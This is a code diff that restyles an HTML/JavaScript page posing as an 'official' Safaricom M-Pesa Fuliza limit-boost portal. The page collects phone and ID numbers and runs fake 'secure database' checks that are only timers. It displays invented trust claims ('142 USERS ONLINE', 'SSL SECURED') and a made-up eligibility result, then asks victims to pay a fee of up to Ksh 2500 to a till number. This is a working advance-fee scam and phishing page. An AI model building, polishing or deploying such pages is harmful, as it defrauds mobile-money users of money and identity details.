@@ -7,113 +7,147 @@
 
 <style>
 body {
-  margin:0;
+  margin: 0;
   font-family: Arial, sans-serif;
-  background:#f3f4f6;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
+  background: #f3f4f6;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
 }
 
 /* CARD */
 .card {
-  background:white;
-  padding:25px;
-  border-radius:20px;
-  width:90%;
-  max-width:380px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
-  text-align:center;
+  width: 90%;
+  max-width: 380px;
+  background: white;
+  border-radius: 25px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+
+/* ICON CIRCLE */
+.icon-circle {
+  width: 90px;
+  height: 90px;
+  background: #e6f4ea;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 15px;
+  font-size: 35px;
+  color: #16a34a;
+}
+
+/* TEXT */
+.title {
+  font-size: 26px;
+  font-weight: bold;
+  color: #0f172a;
+}
+
+.subtitle {
+  color: #16a34a;
+  font-size: 12px;
+  letter-spacing: 1px;
+  margin: 5px 0 15px;
+}
+
+.desc {
+  color: #6b7280;
+  font-size: 14px;
+  margin-bottom: 20px;
 }
 
 /* INPUT */
-.input {
-  width:100%;
-  padding:14px;
-  border-radius:12px;
-  border:1px solid #ddd;
-  margin-top:10px;
+.input-box {
+  display: flex;
+  align-items: center;
+  background: #f1f5f9;
+  border-radius: 12px;
+  padding: 12px;
+  margin-bottom: 15px;
 }
 
-/* BUTTONS */
+.input-box span {
+  margin-right: 10px;
+}
+
+.input-box input {
+  border: none;
+  background: transparent;
+  outline: none;
+  width: 100%;
+  font-size: 14px;
+}
+
+/* BUTTON */
 button {
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:12px;
-  font-size:16px;
-  margin-top:15px;
+  width: 100%;
+  padding: 15px;
+  border-radius: 12px;
+  border: none;
+  background: #16a34a;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
 }
 
-.green { background:#16a34a; color:white; }
-.dark { background:#0f172a; color:white; }
+/* LIVE STATUS */
+.live {
+  margin-top: 15px;
+  font-size: 12px;
+  color: #6b7280;
+}
+
+.live span {
+  color: #16a34a;
+  font-weight: bold;
+}
 
 /* LOADER */
 .loader {
-  width:50px;
-  height:50px;
-  border:5px solid #e5e7eb;
-  border-top:5px solid #16a34a;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  margin:auto;
+  width: 50px;
+  height: 50px;
+  border: 5px solid #e5e7eb;
+  border-top: 5px solid #16a34a;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 15px;
 }
 
 @keyframes spin {
-  100% { transform:rotate(360deg); }
+  100% { transform: rotate(360deg); }
 }
 
 /* GRID */
 .grid {
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:10px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
 }
 
 .box {
-  padding:15px;
-  border-radius:12px;
-  background:#f9fafb;
-  cursor:pointer;
-  border:2px solid transparent;
+  padding: 15px;
+  border-radius: 12px;
+  background: #f9fafb;
+  border: 2px solid transparent;
+  cursor: pointer;
 }
 
 .box.active {
-  border:2px solid #16a34a;
-  background:#e8f5e9;
-}
-
-.fee {
-  font-size:12px;
-  color:#666;
-}
-
-/* SUCCESS */
-.success-icon {
-  width:80px;
-  height:80px;
-  background:#16a34a;
-  color:white;
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:30px;
-  margin:0 auto 20px;
-}
-
-.phone {
-  color:#16a34a;
-  font-weight:bold;
+  border: 2px solid #16a34a;
+  background: #e8f5e9;
 }
 
 /* MODAL */
 .modal {
-  position:fixed;
+  position: fixed;
   top:0; left:0;
   width:100%; height:100%;
-  background:rgba(0,0,0,0.5);
+  background: rgba(0,0,0,0.4);
   display:none;
   align-items:center;
   justify-content:center;
@@ -127,42 +161,27 @@ button {
   overflow:hidden;
 }
 
-/* HEADER */
 .modal-header {
   background:#16a34a;
   color:white;
   padding:20px;
 }
 
-/* BODY */
-.modal-body {
-  padding:20px;
-}
+.modal-body { padding:20px; }
 
-/* INFO BOX */
-.info-box {
+.info {
   background:#e8f5e9;
-  padding:15px;
-  border-radius:12px;
-  font-size:14px;
-  margin-bottom:15px;
+  padding:10px;
+  border-radius:10px;
+  margin-bottom:10px;
 }
 
-/* ACTIONS */
-.modal-actions {
-  display:flex;
-  gap:10px;
-}
-
-.cancel-btn {
-  flex:1;
-  background:#f3f4f6;
-}
-
-.pay-btn {
-  flex:1;
-  background:#16a34a;
-  color:white;
+.input {
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  border:1px solid #ddd;
+  margin-bottom:10px;
 }
 </style>
 </head>
@@ -178,17 +197,14 @@ button {
       <small>SECURE FULIZA APPLICATION</small>
       <h3 id="modalTitle"></h3>
     </div>
-
     <div class="modal-body">
-      <div class="info-box" id="modalFee"></div>
+      <div class="info" id="modalFee"></div>
 
       <input class="input" placeholder="ID Number">
       <input class="input" value="0704343709">
 
-      <div class="modal-actions">
-        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
-        <button class="pay-btn" id="payBtn">Pay</button>
-      </div>
+      <button onclick="closeModal()">Cancel</button>
+      <button id="payBtn">Pay</button>
     </div>
   </div>
 </div>
@@ -198,41 +214,56 @@ let step = 1;
 let selectedAmount = 3000;
 
 const limits = [
-{amount:3000, fee:250},
-{amount:5000, fee:293},
-{amount:7500, fee:350},
-{amount:10000, fee:500},
-{amount:12500, fee:747},
-{amount:16000, fee:898},
-{amount:21000, fee:1015},
-{amount:25500, fee:1220},
-{amount:30000, fee:1533},
-{amount:35000, fee:1730},
-{amount:45000, fee:2000},
-{amount:60000, fee:2250},
-{amount:70000, fee:2500}
+  {amount:3000, fee:250},
+  {amount:5000, fee:293},
+  {amount:7500, fee:350},
+  {amount:10000, fee:500},
+  {amount:12500, fee:747},
+  {amount:16000, fee:898},
+  {amount:21000, fee:1015},
+  {amount:25500, fee:1220},
+  {amount:30000, fee:1533},
+  {amount:35000, fee:1730},
+  {amount:45000, fee:2000},
+  {amount:60000, fee:2250},
+  {amount:70000, fee:2500}
 ];
 
-function getFee(a){
-  return limits.find(l=>l.amount===a).fee;
+function getFee(amount){
+  return limits.find(l => l.amount === amount).fee;
 }
 
 function render(){
   const app = document.getElementById("app");
 
-  /* STEP 1 */
-  if(step===1){
+  /* STEP 1 (UPDATED DESIGN) */
+  if(step === 1){
     app.innerHTML = `
     <div class="card">
-      <h2>Fuliza Plus+</h2>
-      <p>Verify your identity</p>
-      <input class="input" placeholder="Enter M-Pesa Number">
-      <button class="green" onclick="next()">Check My Eligibility</button>
+      <div class="icon-circle">👤</div>
+
+      <div class="title">Fuliza Plus+</div>
+      <div class="subtitle">OFFICIAL VERIFICATION PORTAL</div>
+
+      <div class="desc">
+        Verify your identity to unlock higher daily transaction limits.
+      </div>
+
+      <div class="input-box">
+        <span>📞</span>
+        <input placeholder="Enter M-Pesa Number">
+      </div>
+
+      <button onclick="next()">Check My Eligibility →</button>
+
+      <div class="live">
+        <span>● 142 USERS ONLINE</span> &nbsp; | &nbsp; 🔒 SSL SECURED
+      </div>
     </div>`;
   }
 
-  /* LOADING */
-  if(step>=2 && step<=5){
+  /* LOADING STEPS */
+  if(step >=2 && step <=5){
     const texts = [
       "Connecting...",
       "Checking Usage History...",
@@ -245,35 +276,34 @@ function render(){
       <h3>${texts[step-2]}</h3>
       <p>Accessing secure databases...</p>
     </div>`;
-    setTimeout(()=>{step++;render();},1500);
+    setTimeout(()=>{ step++; render(); }, 1500);
   }
 
-  /* SUCCESS */
-  if(step===6){
+  /* CONGRATS */
+  if(step === 6){
     app.innerHTML = `
     <div class="card">
-      <div class="success-icon">✓</div>
+      <div class="icon-circle">✔</div>
       <h2>Congratulations!</h2>
-      <p>High Trust Score Detected. 
-      <span class="phone">0704343709</span> is eligible for a boost.</p>
-      <button class="dark" onclick="next()">Proceed to Upgrade Limit</button>
+      <p>High Trust Score Detected. <b style="color:#16a34a">0704343709</b> is eligible.</p>
+      <button style="background:#0f172a" onclick="next()">Proceed to Upgrade Limit</button>
     </div>`;
   }
 
-  /* LIMITS */
-  if(step===7){
+  /* LIMIT SELECTION */
+  if(step === 7){
     app.innerHTML = `
     <div class="card">
-      <h3>Select Your Limit</h3>
+      <h2>Select Your Limit</h2>
       <div class="grid">
         ${limits.map(l=>`
           <div class="box ${l.amount===selectedAmount?'active':''}" onclick="select(${l.amount})">
             <strong>Ksh ${l.amount}</strong>
-            <div class="fee">Fee: Ksh ${l.fee}</div>
+            <div>Fee: Ksh ${l.fee}</div>
           </div>
         `).join("")}
       </div>
-      <button class="green" onclick="openModal()">Upgrade to Ksh ${selectedAmount}</button>
+      <button onclick="openModal()">UPGRADE TO Ksh ${selectedAmount}</button>
     </div>`;
   }
 }
@@ -289,23 +319,21 @@ function select(a){
 }
 
 function openModal(){
-  let fee = getFee(selectedAmount);
+  const fee = getFee(selectedAmount);
 
-  document.getElementById("modal").style.display="flex";
-
+  document.getElementById("modal").style.display = "flex";
   document.getElementById("modalTitle").innerText =
-  "Limit will be boosted to Ksh " + selectedAmount;
+    "Limit will be boosted to Ksh " + selectedAmount;
 
   document.getElementById("modalFee").innerHTML =
-  `Enter your Safaricom number for VERIFICATION! Once payment to Till Number 
-  <b>6363781</b> is confirmed, your boost request will begin processing.`;
+    `Pay <b>Ksh ${fee}</b> to Till <b>6363781</b> to proceed.`;
 
   document.getElementById("payBtn").innerText =
-  "Pay Ksh " + fee;
+    "Pay Ksh " + fee;
 }
 
 function closeModal(){
-  document.getElementById("modal").style.display="none";
+  document.getElementById("modal").style.display = "none";
 }
 
 render();
